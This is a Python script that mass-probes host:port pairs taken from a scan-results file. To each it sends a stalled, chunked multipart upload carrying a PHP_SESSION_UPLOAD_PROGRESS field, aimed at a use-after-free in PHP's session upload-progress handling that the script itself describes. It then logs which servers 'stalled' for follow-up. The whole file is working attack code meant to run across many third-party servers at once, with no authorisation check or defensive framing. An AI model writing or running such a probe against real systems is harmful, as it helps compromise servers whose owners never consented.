import json
import socket
import sys
import time
from concurrent.futures import ThreadPoolExecutor


def php2shell_probe(host, port, stall=1.5, timeout=6.0):
    """Send a stalled multipart upload-progress body to trigger the Zend
    session.upload_progress use-after-free window, then close the socket.
    Returns (host, port, verdict)."""
    boundary = "----probe"
    body1 = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        + "A" * 512
        + f"\r\n--{boundary}\r\n"
        'Content-Disposition: form-data; name="file"; filename="x.txt"\r\n'
        "Content-Type: text/plain\r\n\r\n"
    )
    head = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n\r\n"
    )

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, int(port)))
        s.sendall(head.encode())

        b = body1.encode()
        s.sendall(f"{len(b):X}\r\n".encode() + b + b"\r\n")

        # Park past session.upload_progress.min_freq (default 1s) so the
        # handler re-enters init and frees the request HashTable.
        time.sleep(stall)

        chunk2 = "B" * 2048
        b2 = chunk2.encode()
        s.sendall(f"{len(b2):X}\r\n".encode() + b2 + b"\r\n")
        s.sendall(b"0\r\n\r\n")

        # Any HTTP status line back means the socket stalled without a
        # connection reset -- worth flagging for manual review.
        try:
            resp = s.recv(256)
        except socket.timeout:
            resp = b""

        if resp.startswith(b"HTTP/"):
            status = resp.split(b"\r\n")[0].decode("latin-1", "replace")
            return (host, port, f"STALLED {status}")
        if resp == b"":
            return (host, port, "STALLED no-response")
        return (host, port, "RESPONDED")
    except socket.timeout:
        return (host, port, "TIMEOUT")
    except ConnectionResetError:
        return (host, port, "RESET")
    except OSError as e:
        return (host, port, f"ERR {e.__class__.__name__}")
    finally:
        try:
            s.close()
        except OSError:
            pass


def main():
    try:
        with open("hits.json") as f:
            hits = json.load(f)
    except (OSError, ValueError) as e:
        print(f"no usable hits.json ({e}); writing empty results")
        hits = []

    targets = []
    for hit in hits:
        ip = hit.get("ip")
        if not ip:
            continue
        for p in hit.get("ports", []):
            port = p.get("port")
            if port:
                targets.append((ip, port))

    print(f"{len(targets)} candidate host:port pairs", flush=True)

    results = []
    if targets:
        with ThreadPoolExecutor(max_workers=32) as pool:
            futures = [pool.submit(php2shell_probe, h, p) for h, p in targets]
            for fut in futures:
                try:
                    h, p, verdict = fut.result()
                except Exception as e:  # noqa: BLE001
                    results.append(f"? - {e.__class__.__name__}")
                    continue
                line = f"{h}:{p} - {verdict}"
                results.append(line)
                print(line, flush=True)

    with open("results.txt", "w") as f:
        f.write("\n".join(results) + ("\n" if results else ""))

    stalled = [r for r in results if "STALLED" in r]
    print(f"\nsummary: {len(results)} probed, {len(stalled)} stalled")
    return 0


if __name__ == "__main__":
    sys.exit(main())
